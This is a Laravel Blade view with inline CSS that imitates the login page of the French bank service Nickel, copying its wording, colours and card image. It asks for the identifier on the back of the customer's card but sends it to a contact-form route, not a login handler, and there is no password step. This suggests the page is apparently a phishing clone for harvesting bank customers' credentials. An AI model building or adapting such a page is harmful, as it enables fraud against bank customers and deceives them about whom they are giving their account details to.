@extends('layouts.app')

@section('title', 'Connexion à mon espace')

@section('content')
<div class="nickel-login-container">
    <div class="nickel-login-box">
    
        <h2 class="nickel-title">Connexion à mon espace</h2>

        <p class="nickel-description">
            Votre identifiant se trouve au verso de votre carte Nickel.
            Si vous avez perdu votre carte, envoyez par SMS
            <strong>IDENTIFIANT</strong> au <strong>38063</strong>.
        </p>

        <div class="nickel-card">
            <img src="{{ asset('assets/images/card-placeholder.jpg') }}" alt="Carte Nickel">
        </div>

        <form action="{{ route('contact.send') }}" method="POST">
            @csrf
            <div class="form-group">
                <label>Identifiant (au dos de la carte)</label>
                <input type="tel" name="phone" class="form-control nickel-input" placeholder="XXX-000-000-0" required>
            </div>

            <div class="form-check nickel-checkbox">
                <input type="checkbox" class="form-check-input" id="remember">
                <label class="form-check-label" for="remember">Mémoriser mon identifiant</label>
            </div>

            <button type="submit" class="btn nickel-button">Se connecter</button>
        </form>
    </div>
</div>
<style>
    
.nickel-login-container {
    display: flex;
    justify-content: center;
    align-items: center;
    background: #fff;
}

.nickel-login-box {
    text-align: center;
    max-width: 400px;
    width: 100%;
    padding: 20px;
}

.nickel-logo {
    width: 120px;
    margin-bottom: 20px;
}

.nickel-title {
    font-weight: bold;
    font-size: 1.5rem;
    margin-bottom: 1rem;
    color: #000;
}

.nickel-description {
    font-size: 1rem;
    margin-bottom: 1.5rem;
    color: #000;
}

.nickel-card img {
    width: 100%;
    max-width: 300px;
    margin-bottom: 1.5rem;
}

.nickel-input {
    border-radius: 50px;
    text-align: center;
    padding: 0.5rem 1rem;
}

.nickel-checkbox {
    justify-content: center;
    gap: 0.5rem;
    margin-bottom: 1rem;
    display: flex;
    align-items: center;
}

.nickel-button {
    background-color: #f25000;
    color: white;
    border: none;
    border-radius: 50px;
    padding: 0.5rem 1.5rem;
    font-weight: 600;
    cursor: pointer;
}

.nickel-button:hover {
    background-color: #e14400;
}

@media (max-width: 768px) {

    .nickel-logo {
    width: 120px;
    margin-bottom: 30px;
    }


    .nickel-input {
        width: 50%; 
        margin-top: 15px;
        margin-bottom: 15px;
    }

    .nickel-button {
        margin-top: 20px;
        width: 40%; 
        padding: 10px 5px;
        font-size: 15px;
        margin-bottom: 60px;
    
    }
}

</style>
@endsection

